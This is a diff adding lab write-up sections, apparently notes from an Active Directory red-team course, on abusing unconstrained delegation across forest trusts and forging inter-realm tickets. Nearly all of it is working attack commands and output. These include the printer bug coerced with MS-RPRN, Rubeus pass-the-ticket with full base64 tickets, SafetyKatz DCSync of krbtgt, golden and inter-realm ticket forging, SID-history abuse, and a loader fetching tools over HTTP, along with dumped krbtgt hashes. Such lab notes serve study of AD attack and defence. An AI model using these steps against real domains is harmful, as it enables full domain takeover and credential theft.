@@ -1053,3 +1053,161 @@ Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrinc
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
 ```
 {% endcode %}
+
+## Flag 43
+
+Hands-On 23 TODO
+
+## Flag 45 - Unconstrained delegation to another domain
+
+If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well
+
+Start a process with the webmaster ticket
+
+{% code overflow="wrap" %}
+```
+ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+Now copy the loader on the us-web machine
+
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
+```
+
+And launch rubeus monitor
+
+{% code overflow="wrap" %}
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:usvendor-dc$ /interval:5 /nowrap
+```
+{% endcode %}
+
+Next use MS-RPRN to abuse the printer bug
+
+<pre data-overflow="wrap"><code><strong>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
+</strong></code></pre>
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+And now the ticket can be imported and can launch a DCSync
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadum::dcsync /user:usvendor\krbtgt /domain:usvendor.local" "exit"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+usvendor krbtgt rc4: _335caf1a29240a5dd318f79b6deaf03f_
+
+## FLag 46 -Share over Domain
+
+We have DA access on the eu.local forest that has a trust relationship with euvendor.local. Let's use the trust key between eu.local and euvendor.local. We can extract the trust key using a Golden ticket for eu.local
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
+```
+{% endcode %}
+
+{% tabs %}
+{% tab title="WinRS" %}
+
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\eu-dc.eu.local\C$\Users\Public\Loader.exe /Y
+```
+{% endcode %}
+
+set with argsplit "lsadump::dcsync" and launch safetykatz to dump the krbtgt hash and then the trust key
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /user:eu\euvendor$ /domain:eu.local" "exit
+```
+{% endcode %}
+
+krbtgt eu.local rc4: _2402af4780a2f427256308f25eb793dc_
+
+Now, forge an inter-realm TGT between eu.local and euvendor.local. We need to run the following commands from eu-dc:
+
+set with argsplit "silver"
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/eu.local /rc4:2402af4780a2f427256308f25eb793dc /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+and now use the ticket with rubeus "asktgs" option
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFEzCCBQ+gAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCA9wwggPYoAMCARehAwIBA6KCA8oEggPGTRbxHRhSyYdkdTt6ijhWyp6ENzJYehwraib3862XHwBmMPlPEZkYSE8D26uHuCtvtzE+oJcLzLDlAlG/vWvVqgH/vM0klSbPbALh+6mGFmWucw3htlSV2tq8Evnln5EDcSw0vjbVWGED4w26iW3H60VT3fA1pL7T4qYKjOKN7K7JM7zTnv9jv/vXiqznj8GQ1rf2C3JKn0BRShg+/FbGsS3CqYidS7IaEgdf5S7EP89NzpO53y/1AsVOs+TjINDPCaOiRMNmZ5iZs11jqErvD/qX0CbMSVXrTFVSjneMIdppIuSLeo6sK3Z0GxKjWT+A1DmQ5p2rwSYiqnbjmR1ZTE8ClifwEduZsyYKFi2HeMrxctYRmP+Nb1WGysUhgUeeQwRc6m7BrtteYurL7oJICdFoC4dGhso9nVxMQT5lUWFC8dKdqeY/BJXXd8CN5MXuWacbWTwc4Tp3BI2EJKS9jCD+Yu8dJ50kSYeWhKjnjwf782QbWAbdc5C6MGobxRZmLp9UySMHdxMuTodp9ygkAUO8v7pIK8btYzkZCgnHzYApeawAN0//Zwk1lYjcKTw0EOPinSkjbenqvEGCRrVSwImG/Hp1LVhNcso7g7wNM5xhMI9DrSxV1EjS+PXKbd5+2BKxLK6aW20brKzN3Mf10CDeXUBTGAK896LjIVl0bHE4qpdCZrMRw5iAcoGkED5mZEshyRL5d/crbYZfhFWxPDBbo/t9CIHXpc8hmz37nXP3a078gsCAoEIETNGp4ptNcdSMoRi7ILd8lHn+q8TXpt3yXCsB6NQVNb9zxMsc6T8zRv+RIRMT/J6vo941/x/6HUwP1WOttkICcEVqvxzqdWYoMQ+qHdaXpTe4je9PKWMsvPdWGufB1t93Fl2HlKVjvLVNOZiOuK2u+Pc4l8y92ZZdOJFvU+daTPP0dBGTbkksoGTgAG8u0xZedxO6hoNl8pMGOD8O6+6IEaxgQHWEQSZbTFwd9wW+hBvWWL5DXhl8x873TfupgPMt38jX0zkq0OAVc6L6DfIWH6vw1qnrTtF1URzOZwqReCmDB7LQaukr8Ui/GCbPu58QAmlBHuO/TI0tAyD5HUuDIYLxaJYkJK/WuwIsqzn2XSrKGwktI3vP31Lp5DuteJ77fSnTv3HBo9yVOtw/gZECglNdSj5RloMV6jAuniO6NAwzyH1PoHX9PsFiTF1NcQh9r85dr3Jwdb3TS302mo3QzerniqbIO6lszHD6E4WIsVMwHW65jYmHWhAU78cHh9eskKy/qDcnoAqymEjDo4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgGzAZoAMCARehEgQQ4L3FEyjnUViFSjetqseKjqEKGwhFVS5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNDA1MDYxNDU3MzVapREYDzIwMjQwNTA2MTQ1NzM1WqYRGA8yMDI0MDUwNzAwNTczNVqnERgPMjAyNDA1MTMxNDU3MzVaqAobCEVVLkxPQ0FMqR0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbA==
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+
+{% tab title="PS-Remoting" %}
+Let's check if SIDHistroy is enabled for the trust between eu.local and euvendor.local using the Active Directory module.
+
+Get-ADObject -Identity "CN=SID History,CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Server euvendor.local -Properties AllowedAttributes
+
+Transfer InviShell on the machine:
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\eu-dc.eu.local\C$\Users\Public\InShellProf.dll /Y
+echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\eu-dc.eu.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
+```
+{% endcode %}
+
+Now access with Winrs and launch Invishell. Now check if there are any groups with SID>1000 in euvendor.local that we can impersonate to avoid SIDFiltering&#x20;
+
+{% code overflow="wrap" %}
+```
+Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+Now craft a silver ticket with the sid of the chosen group
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /nowrap
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+Now use the generated ticket to ask a tgs
+
+<pre data-overflow="wrap"><code><strong> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:http/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFOzCCBTegAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCBAQwggQAoAMCARehAwIBA6KCA/IEggPuPfLV68znCcJWOfT23POLxq8A/estsOZq3Sg7gyhAYqrbvpOPI8IJrPgRc+RJw/8/MXUF2WPtt7CfWw9LsZ4j4nPIfWudUXrdciUCDkBWmomY/T3wU/I6IGr7GcYoSf+MMWq7pRygM6FedzYREj1HPtN2W2RWt/Qn4f1oWziZ4AOLn7KCchW06EWBHmIdhAMfaqqfAXyjLzzAyaNOjXMuvupenHUy6iPD2NmbosKd9fqo6G9nef2cW953oE4grYhFy0FY3Qvh10HmpgGGfqdRPXPPy4LGIFVuDTa1ei0ti5vS0TM8dFm1V7WgolOcae7cqGkAgH3cx1aq/Ic4kgHI0OUoyc/l9Fw1UOUaic1TYkbdOQ0h8643SG8oEWHcGgOy6/enZ+LEF1JluY39jatYW6l/HJxWCiKBd0Zbv54Py2kF4YweG8eeAWxNn3ekoMXs5wPzhuJ3s+By4v2j/ZggpWcooAjITGVyEmB66m7GOAJG8U84zdIRheCb/KXsJvDNGvL3PD9lWs5C2BF8LQPLyWZwefNPbGoq9WCjP2kHHnqm5BmNy9XkK+bxrcfDaqK8Q0CfUSzw5mWhhSwD0HrBb0u6JbMVQcYvuVK7+wcyMI2GBsOwNClfy6qfCJ72qXmcHIPhmEIiulmls40s7OCT2/x/TGDBFqFCYOHMnDZsjDm0YmvPLftiuz2Urj/uDQmdcLxUrWJ3dDyhwSubhfXzfbI1cI+l+m9GZfL4+tgVppdoiYa1+SdBFd4Yo83PS40KZlL7QqmwNVfXf26tlD75wo9b6r9A7p57zxRlXIGNXPMdciRkDSXL1TO9LTquwtE3GH/frOCuHCQzILOBPh9OXS1yzR+l6ZIzUgcexabBy5AGfZv8HO9qZN52UY9m+YABmqsG4gyAKq84rLpdy2VGAiBZ8m+uOeEQySL0K9yso80on0nPEDEc5SzaTOq2m8rn89ft7owwZ5RsA/zrSsgeT6nY1auOLDWOsY+eu5dJCrwoGzXYCH3trEj5lFv5FGqXFIxa5I1y6WmJsfuFohYmvX/MmILJFTTZ3OWWqZZEtH7qEB/I7/z9RgkEM3NpWiopMs/ENwMRvn2uSP/B7kP7QvSsUgLhgJ7oa4MHaTRr304uCZJhOJyNPx6fka6Q9hbgoj3DcgXM2E9RWKn2xAs15EaaaH4+RZHjDQ0DDfSrPH5Dff2+Nilj0eizxZ2YwTh6/ltEi1ylFNMKT7tdMrcIg94npWmBRWgBGOwhciCciA6h75pS/qsThTrrIsBmOJ55nRmaVsBxPgeDpkWE7glUS3Ek/Awt9tWc01ilk/Je4Tg+M1sEV6W5uc28XW3mMqOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoBswGaADAgEXoRIEEHjJQyXb6ztHIpuC5RNdeO2hChsIRVUuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjQwNTA2MTUzMzIyWqURGA8yMDI0MDUwNjE1MzMyMlqmERgPMjAyNDA1MDcwMTMzMjJapxEYDzIwMjQwNTEzMTUzMzIyWqgKGwhFVS5MT0NBTKkdMBugAwIBAqEUMBIbBmtyYnRndBsIZXUubG9jYWw=
+</strong></code></pre>
+{% endtab %}
+{% endtabs %}
+
+
+
